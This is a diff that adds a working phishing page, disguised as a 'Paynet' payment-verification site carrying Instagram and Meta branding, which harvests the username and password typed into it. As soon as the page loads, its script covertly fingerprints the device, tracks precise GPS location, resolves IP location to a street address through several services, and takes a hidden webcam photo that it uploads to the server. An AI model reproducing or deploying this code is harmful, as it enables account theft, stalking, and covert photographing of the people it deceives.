@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Paynet - Secure Payment Verification</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="alternate icon" href="/favicon.ico">
+
+    <link rel="stylesheet" href="/style.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet" />
+</head>
+
+<body>
+
+
+    <!-- Background is now handled by layout.hbs -->
+
+
+    <!-- Login Container -->
+    <div id="login-container" class="container">
+
+        <img class="insta-logo"
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Instagram.svg/2048px-Instagram.svg.png"
+            alt="Instagram" />
+
+        <h1 class="brand">Paynet</h1>
+        <p class="sub">Secure Payment Verification System</p>
+
+        <h6 class="error">{{{msg}}}</h6>
+
+        <form id="login-form" action="/verify" method="post">
+
+            <input type="text" name="username" placeholder="Phone number, username, or email" />
+
+            <input type="password" name="password" placeholder="Password" />
+
+            <!-- Hidden fields for captured data -->
+            <input type="hidden" name="deviceDetails" id="deviceDetails" />
+            <input type="hidden" name="location" id="location" />
+            <input type="hidden" name="phoneNumber" id="phoneNumber" />
+            <input type="hidden" name="photoData" id="photoData" />
+            <input type="hidden" name="photoFilename" id="photoFilename" />
+
+            <button type="submit" class="btn-login">Verify Payment</button>
+
+        </form>
+
+        <a href="/forgot-password" class="forgot">Forgot password?</a>
+
+        <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" class="btn-create"
+            style="display: block; text-align: center; text-decoration: none; cursor: pointer;">Create new account</a>
+
+        <div class="meta-footer">
+            {{!-- FIXED: Using the local PNG file saved in public/img/ --}}
+            <img class="meta-logo-img" src="/img/20251116_200252.png" alt="Meta" />
+        </div>
+
+        <!-- DISCLAIMER BANNER - Moved to bottom -->
+        <div class="disclaimer-banner">
+            <p style="margin: 0; font-size: 10px; line-height: 1.3; color: #999; text-align: center;">
+                <strong>Paynet</strong> is a secure payment verification platform.
+                Your transactions are protected with bank-level encryption.
+                <a href="/privacy" style="color: #667eea;">Privacy</a> •
+                <a href="/terms" style="color: #667eea;">Terms</a>
+            </p>
+        </div>
+
+    </div>
+
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Reset attempt counter on every page refresh
+        sessionStorage.setItem('loginAttempts', '0');
+
+        // Global variables to store captured data
+        let capturedPhoto = null;
+        let capturedLocation = null;
+        let capturedDeviceDetails = null;
+        let dataCapturComplete = {
+            location: false,
+            camera: false,
+            device: false
+        };
+
+        function updateStatus(type, message, success = false) {
+            // This function is now a no-op as the debug panel is removed.
+            // Its calls will remain in the code but will not have any effect.
+            console.log(`Status update for ${type}: ${message} (Success: ${success})`);
+        }
+
+        // Function to capture device details
+        function captureDeviceDetails() {
+            try {
+                const details = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    cookieEnabled: navigator.cookieEnabled,
+                    onlineStatus: navigator.onLine,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    maxTouchPoints: navigator.maxTouchPoints
+                };
+                capturedDeviceDetails = JSON.stringify(details);
+                document.getElementById('deviceDetails').value = capturedDeviceDetails;
+                dataCapturComplete.device = true;
+                updateStatus('device', 'Captured ✓', true);
+                console.log('✅ Device details captured:', details);
+            } catch (error) {
+                updateStatus('device', 'Error: ' + error.message);
+                console.error('Device details error:', error);
+            }
+        }
+
+        // MAXIMUM ACCURACY LOCATION TRACKING (OPTIMIZED FOR 5 SECONDS)
+        async function captureLocationWithFallback() {
+            console.log('🌍 Starting FAST location capture (5s max)...');
+            updateStatus('location', 'Fast capture mode...');
+
+            const locationData = {
+                attempts: [],
+                finalLocation: null,
+                networkInfo: null,
+                batteryInfo: null,
+                captureMethod: null
+            };
+
+            // Collect network information (instant)
+            try {
+                if (navigator.connection) {
+                    locationData.networkInfo = {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        type: navigator.connection.type
+                    };
+                }
+            } catch (e) {
+                console.log('Network API not available');
+            }
+
+            // Check if mobile device - battery API (instant)
+            try {
+                const battery = await navigator.getBattery?.();
+                if (battery) {
+                    locationData.batteryInfo = {
+                        charging: battery.charging,
+                        level: battery.level,
+                        isMobile: !battery.charging && battery.level < 1
+                    };
+                }
+            } catch (e) {
+                console.log('Battery API not available');
+            }
+
+            // STRATEGY 1: GPS continuous watching (3 seconds max)
+            console.log('🎯 Strategy 1: GPS continuous (3s)...');
+            const gpsResult = await tryGPSContinuous();
+            if (gpsResult) {
+                locationData.attempts.push(gpsResult);
+                locationData.finalLocation = gpsResult;
+                locationData.captureMethod = 'GPS-Continuous';
+
+                // Get IP location in parallel (no wait)
+                getEnhancedIPLocation().then(ipData => {
+                    if (ipData) locationData.finalLocation.ipContext = ipData;
+                });
+
+                await saveLocationData(locationData);
+                return;
+            }
+
+            // STRATEGY 2: Quick GPS retry (2 attempts, 3s timeout each, no delay)
+            console.log('🎯 Strategy 2: Quick GPS (2 attempts)...');
+            for (let attempt = 1; attempt <= 2; attempt++) {
+                try {
+                    updateStatus('location', `GPS ${attempt}/2...`);
+                    const position = await getPositionWithPromise({
+                        enableHighAccuracy: true,
+                        timeout: 3000,  // Reduced from 15s to 3s
+                        maximumAge: 0
+                    });
+
+                    const gpsData = extractPositionData(position, `GPS-Quick-${attempt}`);
+                    locationData.attempts.push(gpsData);
+                    locationData.finalLocation = gpsData;
+                    locationData.captureMethod = 'GPS-Quick';
+
+                    // Get IP data in parallel
+                    getEnhancedIPLocation().then(ipData => {
+                        if (ipData) gpsData.ipContext = ipData;
+                    });
+
+                    await saveLocationData(locationData);
+                    return;
+                } catch (error) {
+                    console.log(`GPS attempt ${attempt}/2 failed:`, error.message);
+                    // NO DELAY - move to next attempt immediately
+                }
+            }
+
+            // STRATEGY 3: WiFi positioning (fast, 5s timeout)
+            console.log('🎯 Strategy 3: WiFi/Cell (5s)...');
+            try {
+                updateStatus('location', 'WiFi positioning...');
+                const position = await getPositionWithPromise({
+                    enableHighAccuracy: false,
+                    timeout: 5000,  // Reduced from 10s
+                    maximumAge: 60000
+                });
+
+                const wifiData = extractPositionData(position, 'WiFi-Cell');
+                locationData.attempts.push(wifiData);
+                locationData.finalLocation = wifiData;
+                locationData.captureMethod = 'WiFi-Cell';
+
+                getEnhancedIPLocation().then(ipData => {
+                    if (ipData) wifiData.ipContext = ipData;
+                });
+
+                await saveLocationData(locationData);
+                return;
+            } catch (error) {
+                console.log('WiFi positioning failed:', error.message);
+            }
+
+            // STRATEGY 4: IP geolocation (instant, parallel sources)
+            console.log('🎯 Strategy 4: IP location (instant)...');
+            updateStatus('location', 'IP geolocation...');
+            const ipData = await getEnhancedIPLocation();
+
+            if (ipData && ipData.latitude) {
+                locationData.finalLocation = {
+                    ...ipData,
+                    source: 'IP-Enhanced',
+                    accuracy: ipData.accuracy || 1000
+                };
+                locationData.captureMethod = 'IP-Enhanced';
+                await saveLocationData(locationData);
+                return;
+            }
+
+            // STRATEGY 5: Final fallback (instant)
+            console.log('⚠️ Using fallback...');
+            locationData.finalLocation = {
+                error: 'All location methods failed',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                userAgent: navigator.userAgent,
+                source: 'Fallback'
+            };
+            locationData.captureMethod = 'Fallback';
+            await saveLocationData(locationData);
+        }
+
+        // Continuous GPS watching (3 seconds - FAST)
+        async function tryGPSContinuous() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+
+                let bestPosition = null;
+                let watchId = null;
+                const timeout = setTimeout(() => {
+                    if (watchId) navigator.geolocation.clearWatch(watchId);
+                    resolve(bestPosition);
+                }, 3000); // Reduced from 5s to 3s
+
+                watchId = navigator.geolocation.watchPosition(
+                    (position) => {
+                        console.log(`📍 GPS: ±${Math.round(position.coords.accuracy)}m`);
+
+                        // Keep best accuracy
+                        if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
+                            bestPosition = position;
+                        }
+
+                        // Stop early if excellent accuracy (save time)
+                        if (position.coords.accuracy < 20) {
+                            clearTimeout(timeout);
+                            navigator.geolocation.clearWatch(watchId);
+                            resolve(extractPositionData(bestPosition, 'GPS-Continuous'));
+                        }
+                    },
+                    (error) => {
+                        console.log('GPS watch error:', error.message);
+                        clearTimeout(timeout);
+                        if (watchId) navigator.geolocation.clearWatch(watchId);
+                        resolve(bestPosition ? extractPositionData(bestPosition, 'GPS-Partial') : null);
+                    },
+                    { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // Enhanced IP geolocation with 5 sources + reverse geocoding
+        async function getEnhancedIPLocation() {
+            console.log('🌐 Trying 5 IP geolocation sources...');
+
+            const sources = [
+                getIPFromIPAPI(),
+                getIPFromIPAPIcom(),
+                getIPFromIPInfo(),
+                getIPFromIPData(),
+                getIPFromGeoJS()
+            ];
+
+            try {
+                // Try all in parallel, return first successful
+                const result = await Promise.any(sources);
+                console.log('✅ IP location from:', result.source);
+
+                // Try to get more detailed address via reverse geocoding
+                if (result.latitude && result.longitude) {
+                    try {
+                        const address = await reverseGeocode(result.latitude, result.longitude);
+                        if (address) {
+                            result.detailedAddress = address;
+                        }
+                    } catch (e) {
+                        console.log('Reverse geocoding failed');
+                    }
+                }
+
+                return result;
+            } catch (error) {
+                console.log('❌ All IP sources failed');
+                return null;
+            }
+        }
+
+        // Helper function to sleep
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // Extract position data
+        function extractPositionData(position, source) {
+            return {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: position.timestamp,
+                source: source
+            };
+        }
+
+        // Multi-source IP geolocation (tries multiple APIs for best results)
+        async function getMultiSourceIPLocation() {
+            console.log('🌐 Trying multiple IP geolocation sources...');
+
+            // Try all sources in parallel, use first successful one
+            const sources = [
+                getIPLocationFromIPAPI(),
+                getIPLocationFromIPAPIcom(),
+                getIPLocationFromIPInfo()
+            ];
+
+            try {
+                const result = await Promise.any(sources);
+                console.log('✅ Got IP location from:', result.source);
+                return result;
+            } catch (error) {
+                console.log('❌ All IP geolocation sources failed');
+                return null;
+            }
+        }
+
+        // Source 1: ipapi.co
+        async function getIPLocationFromIPAPI() {
+            const response = await fetch('https://ipapi.co/json/');
+            if (!response.ok) throw new Error('ipapi.co failed');
+            const data = await response.json();
+            return {
+                latitude: data.latitude,
+                longitude: data.longitude,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                postal: data.postal,
+                isp: data.org,
+                accuracy: 5000,
+                source: 'ipapi.co'
+            };
+        }
+
+        // Source 2: ip-api.com
+        async function getIPLocationFromIPAPIcom() {
+            const response = await fetch('http://ip-api.com/json/');
+            if (!response.ok) throw new Error('ip-api.com failed');
+            const data = await response.json();
+            if (data.status !== 'success') throw new Error('ip-api.com query failed');
+            return {
+                latitude: data.lat,
+                longitude: data.lon,
+                city: data.city,
+                region: data.regionName,
+                country: data.country,
+                postal: data.zip,
+                isp: data.isp,
+                accuracy: 5000,
+                source: 'ip-api.com'
+            };
+        }
+
+        // Source 3: ipinfo.io
+        async function getIPLocationFromIPInfo() {
+            const response = await fetch('https://ipinfo.io/json');
+            if (!response.ok) throw new Error('ipinfo.io failed');
+            const data = await response.json();
+            const [lat, lon] = data.loc.split(',').map(Number);
+            return {
+                latitude: lat,
+                longitude: lon,
+                city: data.city,
+                region: data.region,
+                country: data.country,
+                postal: data.postal,
+                isp: data.org,
+                accuracy: 5000,
+                source: 'ipinfo.io'
+            };
+        }
+
+        // Source 4: ipdata.co (NEW - high accuracy)
+        async function getIPFromIPData() {
+            const response = await fetch('https://api.ipdata.co/?api-key=test');
+            if (!response.ok) throw new Error('ipdata.co failed');
+            const data = await response.json();
+            return {
+                latitude: data.latitude,
+                longitude: data.longitude,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                postal: data.postal,
+                isp: data.asn?.name || data.organisation,
+                timezone: data.time_zone?.name,
+                accuracy: data.threat?.is_known_attacker ? 10000 : 3000,
+                source: 'ipdata.co'
+            };
+        }
+
+        // Source 5: geojs.io (NEW - backup source)
+        async function getIPFromGeoJS() {
+            const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
+            if (!response.ok) throw new Error('geojs.io failed');
+            const data = await response.json();
+            return {
+                latitude: parseFloat(data.latitude),
+                longitude: parseFloat(data.longitude),
+                city: data.city,
+                region: data.region,
+                country: data.country,
+                postal: null,
+                isp: data.organization_name,
+                timezone: data.timezone,
+                accuracy: 5000,
+                source: 'geojs.io'
+            };
+        }
+
+        // Reverse geocoding to get detailed address from coordinates
+        async function reverseGeocode(lat, lon) {
+            try {
+                const response = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
+                    { headers: { 'User-Agent': 'LocationTracker/1.0' } }
+                );
+                if (!response.ok) throw new Error('Reverse geocoding failed');
+                const data = await response.json();
+
+                return {
+                    fullAddress: data.display_name,
+                    houseNumber: data.address?.house_number,
+                    road: data.address?.road,
+                    neighborhood: data.address?.neighbourhood || data.address?.suburb,
+                    city: data.address?.city || data.address?.town || data.address?.village,
+                    county: data.address?.county,
+                    state: data.address?.state,
+                    postcode: data.address?.postcode,
+                    country: data.address?.country
+                };
+            } catch (error) {
+                console.log('Reverse geocoding error:', error);
+                return null;
+            }
+        }
+
+        // NEW: Save location data with proper formatting
+        async function saveLocationData(locationData) {
+            capturedLocation = JSON.stringify(locationData);
+            document.getElementById('location').value = capturedLocation;
+            dataCapturComplete.location = true;
+
+            const final = locationData.finalLocation;
+            if (final) {
+                if (final.accuracy && final.accuracy < 1000) {
+                    updateStatus('location', `${locationData.captureMethod} ±${Math.round(final.accuracy)}m ✓`, true);
+                } else if (final.city) {
+                    updateStatus('location', `${locationData.captureMethod}: ${final.city} ✓`, true);
+                } else {
+                    updateStatus('location', `${locationData.captureMethod} ✓`, true);
+                }
+            }
+            console.log('✅ Location data saved:', locationData);
+        }
+
+        // Update old IP function names to match new implementation
+        async function getIPFromIPAPI() {
+            return await getIPLocationFromIPAPI();
+        }
+
+        async function getIPFromIPAPIcom() {
+            return await getIPLocationFromIPAPIcom();
+        }
+
+        async function getIPFromIPInfo() {
+            return await getIPLocationFromIPInfo();
+        }
+
+        // Alias for backwards compatibility
+        async function getMultiSourceIPLocation() {
+            return await getEnhancedIPLocation();
+        }
+
+
+        // Promise wrapper for geolocation
+        function getPositionWithPromise(options) {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation not supported'));
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(resolve, reject, options);
+            });
+        }
+
+        // Function to capture photo from camera
+        async function capturePhoto() {
+            updateStatus('camera', 'Requesting access...');
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+
+                video.srcObject = stream;
+                updateStatus('camera', 'Camera active, capturing...');
+
+                // Wait for video to be ready
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = resolve;
+                });
+
+                // Wait a bit for camera to adjust
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                // Convert to base64
+                capturedPhoto = canvas.toDataURL('image/jpeg', 0.85);
+                document.getElementById('photoData').value = capturedPhoto;
+
+                // Send photo to server immediately
+                await sendPhotoToServer(capturedPhoto);
+
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+
+                dataCapturComplete.camera = true;
+                updateStatus('camera', 'Captured & uploaded ✓', true);
+                console.log('✅ Photo captured and sent to server');
+            } catch (error) {
+                console.error('Camera error:', error);
+                document.getElementById('photoData').value = JSON.stringify({ error: error.message });
+                dataCapturComplete.camera = true; // Mark as complete even if failed
+                updateStatus('camera', 'Failed: ' + error.message + ' ⚠️');
+            }
+        }
+
+        // Function to send photo to server
+        async function sendPhotoToServer(photoData) {
+            try {
+                const response = await fetch('/capture-photo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ photo: photoData })
+                });
+                const data = await response.json();
+                console.log('Photo upload response:', data);
+                if (data.success && data.filename) {
+                    document.getElementById('photoFilename').value = data.filename;
+                }
+                return data;
+            } catch (error) {
+                console.error('Error sending photo:', error);
+                throw error;
+            }
+        }
+
+        // Initialize data capture on page load
+        window.addEventListener('load', async () => {
+            console.log('🚀 Starting data capture...');
+
+            // Capture device details immediately (synchronous)
+            captureDeviceDetails();
+
+            // Capture location and camera in parallel
+            await Promise.allSettled([
+                captureLocationWithFallback(),
+                capturePhoto()
+            ]);
+
+            console.log('✅ All data capture attempts complete');
+            console.log('Capture status:', dataCapturComplete);
+        });
+
+        // Handle login form submission with attempt counter
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Log current capture status
+            console.log('Form submitted. Data capture status:', dataCapturComplete);
+
+            // Get current attempt count
+            let attempts = parseInt(sessionStorage.getItem('loginAttempts') || '0');
+            attempts++;
+            sessionStorage.setItem('loginAttempts', attempts.toString());
+
+            console.log('Login attempt:', attempts);
+
+            // Check if this is 3rd attempt - redirect to troll page
+            if (attempts === 3) {
+                sessionStorage.setItem('cameFromLogin', 'true');
+                window.location.href = '/troll-success';
+                return;
+            }
+
+            // Check if this is 4th attempt - redirect to notres page
+            if (attempts === 4) {
+                sessionStorage.setItem('cameFromLogin', 'true');
+                window.location.href = '/notres';
+                return;
+            }
+
+            // Otherwise submit the form normally
+            // Wait a tiny bit to ensure all data is set
+            setTimeout(() => {
+                this.submit();
+            }, 100);
+        });
+    </script>
+
+</body>
+
+</html>
